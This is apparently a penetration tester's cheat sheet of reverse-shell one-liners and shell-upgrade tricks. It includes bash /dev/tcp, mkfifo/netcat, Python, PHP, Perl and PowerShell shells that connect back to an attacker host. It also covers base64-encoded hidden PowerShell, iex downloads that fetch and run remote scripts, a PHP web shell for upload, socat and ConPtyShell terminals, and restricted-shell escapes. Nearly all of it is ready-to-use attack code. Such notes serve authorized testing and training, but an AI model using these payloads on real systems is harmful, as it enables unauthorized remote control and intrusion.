# Reverse shells and upgrades

## Listener
rlwrap nc -lvnp <LPORT>
- [ ] What the target has, before picking a line: which bash sh python3 php perl nc socat

## Linux
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tmp/f
nc -e /bin/bash <LHOST> <LPORT>
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- [ ] /dev/tcp is bash only: from sh, a web app or cron, keep the bash -c wrapper
- [ ] Old systems: python, not python3
A PHP page to upload instead: /usr/share/webshells/php/php-reverse-shell.php, with $ip and $port set

## Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Quoting gets in the way: encode the part after -c on Kali, then run it with -enc.
echo -n 'THE ONE-LINER' | iconv -t UTF-16LE | base64 -w 0
powershell -nop -w hidden -enc THE-BASE64
Or load a script from Kali into memory (serve files gives its exact address):
powershell -c "iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)"

## Upgrade a Linux shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
With no Python:
script -qc /bin/bash /dev/null
Then Ctrl+Z, and on Kali, as one line:
stty raw -echo; fg
Then Enter, and in the shell, with the rows and columns stty size gives in a Kali terminal:
export SHELL=/bin/bash TERM=xterm-256color
stty rows 38 columns 116
- [ ] Garbled screen: type reset
- [ ] Kali's zsh misbehaving: start the listener from inside bash

## A full terminal straight away
socat on Kali first, then on the target:
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

## A real terminal on Windows
stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>
IEX(IWR -UseBasicParsing http://<LHOST>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <LHOST> <LPORT>
- [ ] With a credential, evil-winrm or RDP beats any shell here

## Out of a limited shell
In vi or vim: :!bash, or :set shell=/bin/bash then :shell
In less, more or man: !bash
In the mysql or psql client: \! bash
In python: import os; os.system("/bin/bash")
